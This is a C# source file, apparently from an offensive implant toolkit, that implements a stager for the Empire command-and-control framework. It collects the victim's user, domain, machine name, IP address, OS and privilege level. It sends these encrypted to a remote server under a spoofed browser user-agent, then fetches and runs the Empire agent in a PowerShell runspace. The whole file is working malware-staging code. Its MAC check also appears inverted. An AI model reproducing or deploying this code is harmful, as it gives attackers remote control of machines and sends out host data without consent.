using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Diagnostics;
using System.Security;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace WheresMyImplant
{
    class EmpireStager : Base
    {
        private string server { get; set; }
        private string stagingKey { get; set; }
        private string language { get; set; }
        
        private byte[] stagingKeyBytes;
        private string id;
        private RSACryptoServiceProvider rsaCrypto;
        private string key;

        ////////////////////////////////////////////////////////////////////////////////
        internal EmpireStager(string server, string stagingKey, string language)
        {
            this.server = server;
            this.stagingKey = stagingKey;
            this.language = language.ToLower();

            stagingKeyBytes = Encoding.ASCII.GetBytes(stagingKey);

            Random random = new Random();
            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            char[] charactersArray = characters.ToCharArray();
            for (Int32 i = 0; i < 8; i++)
            {
                Int32 j = random.Next(charactersArray.Length);
                id += charactersArray[j];
            }

            CspParameters cspParameters = new CspParameters();
            cspParameters.Flags = cspParameters.Flags | CspProviderFlags.UseMachineKeyStore;
            rsaCrypto = new RSACryptoServiceProvider(2048, cspParameters);
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void execute()
        {
            try
            {
                byte[] stage1response = stage1();
                WriteOutputGood("Stage1 Complete");

                byte[] stage2response = stage2(stage1response);
                WriteOutputGood("Stage2 Complete");

                WriteOutputGood("Launching Empire");
                if (language == "powershell" || language == "ps" || language == "posh")
                {
                    powershellEmpire(stage2response);
                }
                else if (language == "dotnet" || language == "net" || language == "clr")
                {
                    dotNetEmpire();
                }
                else
                {
                    //powershellEmpire(stage2response);
                    //Something else to give me a headache in the future
                }
            }
            catch (WebException webError)
            {
                if ((Int32)((HttpWebResponse)webError.Response).StatusCode == 500)
                {
                    GC.Collect();
                    execute();
                }
            }
            catch (Exception error)
            {
                WriteOutputBad("Execution Failed");
                WriteOutputBad(error.ToString());
            }
            finally
            {
                server = null;
                stagingKey = null;
                stagingKeyBytes = null;
                id = null;
                rsaCrypto = null;
                key = null;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        private byte[] stage1()
        {
            Random random = new Random();

            ////////////////////////////////////////////////////////////////////////////////
            string rsaKey = rsaCrypto.ToXmlString(false);
            byte[] rsaKeyBytes = Encoding.ASCII.GetBytes(rsaKey);

            ////////////////////////////////////////////////////////////////////////////////
            byte[] initializationVector = new byte[16];
            random.NextBytes(initializationVector);
            byte[] encryptedBytes = aesEncrypt(stagingKeyBytes, initializationVector, rsaKeyBytes);
            encryptedBytes = combine(initializationVector, encryptedBytes);
            
            ////////////////////////////////////////////////////////////////////////////////
            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = stagingKeyBytes;
            byte[] hmacBytes = hmac.ComputeHash(encryptedBytes);
            encryptedBytes = combine(encryptedBytes, hmacBytes.Take(10).ToArray());

            ////////////////////////////////////////////////////////////////////////////////
            return sendStage(0x02, encryptedBytes, server + "/index.jsp");
        }

        ////////////////////////////////////////////////////////////////////////////////
        private byte[] stage2(byte[] stage1response)
        {
            Random random = new Random();

            ////////////////////////////////////////////////////////////////////////////////
            byte[] decrypted = rsaCrypto.Decrypt(stage1response, false);
            string decryptedString = Encoding.ASCII.GetString(decrypted);
            string nonce = decryptedString.Substring(0, 16);
            key = decryptedString.Substring(16, decryptedString.Length - 16);
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            ////////////////////////////////////////////////////////////////////////////////
            Int64 increment = Convert.ToInt64(nonce);
            increment++;
            nonce = increment.ToString();
            byte[] systemInformationBytes = GetSystemInformation(nonce + "|", server);
            byte[] initializationVector = new byte[16];
            random.NextBytes(initializationVector);
            byte[] encryptedInformationBytes = aesEncrypt(keyBytes, initializationVector, systemInformationBytes);
            encryptedInformationBytes = combine(initializationVector, encryptedInformationBytes);

            ////////////////////////////////////////////////////////////////////////////////
            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = keyBytes;
            byte[] hmacHash = hmac.ComputeHash(encryptedInformationBytes).Take(10).ToArray();
            encryptedInformationBytes = combine(encryptedInformationBytes, hmacHash);

            ////////////////////////////////////////////////////////////////////////////////
            return sendStage(0x03, encryptedInformationBytes, server + "/index.php");
        }

        ////////////////////////////////////////////////////////////////////////////////
        private void powershellEmpire(byte[] stage2Response)
        {
            string empire = Encoding.ASCII.GetString(aesDecrypt(key, stage2Response));
            string execution = "Invoke-Empire";
            execution += " -Servers \"" + server + "\"";
            execution += " -StagingKey \"" + stagingKey + "\"";
            execution += " -SessionKey \"" + key + "\"";
            execution += " -SessionID  \"" + id + "\"";
            WriteOutputNeutral(execution);

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(empire + ";" + execution + ";");
            //pipeline.Commands.Add("Out-String");
            pipeline.Invoke();
            //runspace.Close();
        }

        ////////////////////////////////////////////////////////////////////////////////
        private void dotNetEmpire()
        {
            Agent agent = new Agent(stagingKey, key, id, server);
            agent.execute();
        }

        ////////////////////////////////////////////////////////////////////////////////
        private byte[] sendStage(byte meta, byte[] inputData, string uri)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[4];
            random.NextBytes(initializationVector);

            byte[] data = Encoding.ASCII.GetBytes(id);
            data = combine(data, new byte[4] { 0x01, meta, 0x00, 0x00 });
            data = combine(data, BitConverter.GetBytes(inputData.Length));

            byte[] rc4Data = rc4Encrypt(combine(initializationVector, stagingKeyBytes), data);
            rc4Data = combine(initializationVector, rc4Data);
            rc4Data = combine(rc4Data, inputData);
            return sendData(uri, rc4Data);
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] sendData(string server, byte[] data)
        {
            string userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            byte[] response = new byte[0];
            using (WebClient webClient = new WebClient())
            {
                webClient.Headers.Add("User-Agent", userAgent);
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                response = webClient.UploadData(server, "POST", data);
            }
            return response;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] GetSystemInformation(string information, string server)
        {
            information += server + "|";
            information += Environment.UserDomainName + "|";
            information += Environment.UserName + "|";
            information += Environment.MachineName + "|";

            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            string ipAddress = "";
            foreach (ManagementObject managementObject in objectCollection)
            {
                string[] addresses = (string[])managementObject["IPAddress"];
                if (null != addresses)
                {
                    foreach (string address in addresses)
                    {
                        if (address.Contains("."))
                        {
                            ipAddress = address;
                        }
                    }
                }
            }

            if (0 < ipAddress.Length)
            {
                information += ipAddress + "|";
            }
            else
            {
                information += "0.0.0.0|";
            }

            query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            objectSearcher = new ManagementObjectSearcher(scope, query);
            objectCollection = objectSearcher.Get();
            string operatingSystem = "";
            foreach (ManagementObject managementObject in objectCollection)
            {
                operatingSystem = (string)managementObject["Name"];
                operatingSystem = operatingSystem.Split('|')[0];
            }
            information += operatingSystem + "|";

            Boolean elevated = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            if ("SYSTEM" == Environment.UserName.ToUpper())
            {
                information += "True|";
            }
            else
            {
                information += elevated + "|";
            }

            Process process = Process.GetCurrentProcess();
            information += process.ProcessName + "|";
            information += process.Id + "|";
            information += "powershell|2";
            //information += ".net|" + Environment.Version.Major.ToString() + "|";

            return Encoding.ASCII.GetBytes(information);
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
        {
            byte[] output = new byte[data.Length];
            byte[] s = new byte[256];
            for (Int32 x = 0; x < 256; x++)
            {
                s[x] = Convert.ToByte(x);
            }

            Int32 j = 0;
            for (Int32 x = 0; x < 256; x++)
            {
                j = (j + s[x] + RC4Key[x % RC4Key.Length]) % 256;
                /*
                s[x] ^= s[j];
                s[j] ^= s[x];
                s[x] ^= s[j];
                */
                byte hold = s[x];
                s[x] = s[j];
                s[j] = hold;
            }
            Int32 i = j = 0;


            //run this in order in a for loop
            int k = 0;
            foreach (byte entry in data)
            {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;
                /*
                 * if i = j - very bad juju
                s[i] ^= s[j];
                s[j] ^= s[i];
                s[i] ^= s[j];
                */
                byte hold = s[i];
                s[i] = s[j];
                s[j] = hold;

                output[k++] = Convert.ToByte(entry ^ s[(s[i] + s[j]) % 256]);
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] aesEncrypt(byte[] keyBytes, byte[] ivBytes, byte[] dataBytes)
        {
            byte[] encryptedBytes = new byte[0];
            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
            {
                aesCrypto.Mode = CipherMode.CBC;
                aesCrypto.Key = keyBytes;
                aesCrypto.IV = ivBytes;
                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                encryptedBytes = encryptor.TransformFinalBlock(dataBytes, 0, dataBytes.Length);
            }
            return encryptedBytes;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] aesDecrypt(string key, byte[] data)
        {
            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = Encoding.ASCII.GetBytes(key);

            byte[] calculatedMac = hmac.ComputeHash(data).Take(10).ToArray();
            byte[] mac = data.Skip(data.Length - 10).Take(10).ToArray();

            if (calculatedMac.SequenceEqual(mac))
            {
                return new byte[0];
            }

            data = data.Take(data.Length - 10).ToArray();
            byte[] initializationVector = data.Take(16).ToArray();

            AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider();
            aesCrypto.Mode = CipherMode.CBC;
            aesCrypto.Key = Encoding.ASCII.GetBytes(key);
            aesCrypto.IV = initializationVector;

            byte[] inputBuffer = data.Skip(16).Take(data.Length - 16).ToArray();
            return aesCrypto.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] combine(byte[] byte1, byte[] byte2)
        {
            Int32 dwSize = byte1.Length + byte2.Length;
            MemoryStream memoryStream = new MemoryStream(new byte[dwSize], 0, dwSize, true, true);
            memoryStream.Write(byte1, 0, byte1.Length);
            memoryStream.Write(byte2, 0, byte2.Length);
            byte[] combinedBytes = memoryStream.GetBuffer();
            return combinedBytes;
        }
    }
}
